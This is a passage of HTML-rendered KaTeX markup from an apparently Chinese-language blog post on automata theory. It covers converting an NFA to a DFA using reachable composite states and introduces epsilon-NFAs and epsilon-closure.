class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>会到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。</p><p>之后再看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>会到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">q[q_0,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>会到达<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_1,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0,q_2,q_3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>。 没有再产生新的状态。之前提到的所有综合状态都是可达的。没有提到的就是不可达的。也被称为无用的。</p><p>然后我们一开始写表格的时候不用把所有的综合状态都写出来，因为肯定有很多状态是无用的。我们完全可以从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[q_0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>开始，只写可达的综合状态。</p><p><img src="https://upyun.wuuconix.link/image-20211108141817476.png" alt="转化为DFA步骤" /></p><p><img src="https://upyun.wuuconix.link/image-20211108142904536.png" alt="实操" /></p><p>这样就可以不用再把所有的综合状态都写出来了，节约了时间。</p><p>以下为最终DFA状态转换图。</p><p><img src="https://upyun.wuuconix.link/image-20211108143033748.png" alt="DFA" /></p><h3 id="带空移动的有穷状态自动机"><a class="markdownIt-Anchor" href="#带空移动的有穷状态自动机"></a> 带空移动的有穷状态自动机</h3><p>non-deterministic finite automanton with <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>m</mi><mi>o</mi><mi>v</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\epsilon-moves</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span></p><p>我们之前的FA的输入字符都至少有1个，当时嫌太少还将状态转移函数拓展为了一次性可以接收多个输入字符。但要是这个输入字符为空串呢？</p><p>如果我们允许NFA的输入字符为空串，那么就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon-NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>了。</p><p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20211109190420935.png" alt="扩充" /></p><p><img src="https://upyun.wuuconix.link/image-20211109190501390.png" alt="非空移动" /></p><p><img src="https://upyun.wuuconix.link/image-20211109190507121.png" alt="空移动" /></p><p>我们可以看到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">\epsilon -NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">A</span></span></span></span>看起来很吊，但实际上这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>只能接收一个字符或者空串，不能同时接收多个字符。这里同样需要像之前的DFA和NFA一样对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>进行拓展。</p><p><img src="https://upyun.wuuconix.link/image-20211109193615003.png" alt="德尔塔帽子" /></p><p>以下是一些晦涩的概念。</p><ol><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>u</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>p</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">从</mi><mi>q</mi><mi mathvariant="normal">到</mi><mi>p</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">条</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">记</mi><mi mathvariant="normal">为</mi><mi>ϵ</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">路</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\epsilon-clousure(q)=\{p|从q到p有一条标记为\epsilon的路\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">p</span><span class="mord">∣</span><span class="mord cjk_fallback">从</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">到</span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault">ϵ</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">路</span><span class="mclose">}</span></span></span></span></p><blockquote><p>clousure是闭包的意思，这里的&quot;-“也不是减法的意思，类似于密码学中的&quot;M-序列”，只是一个连接符。</p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon-closure(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord 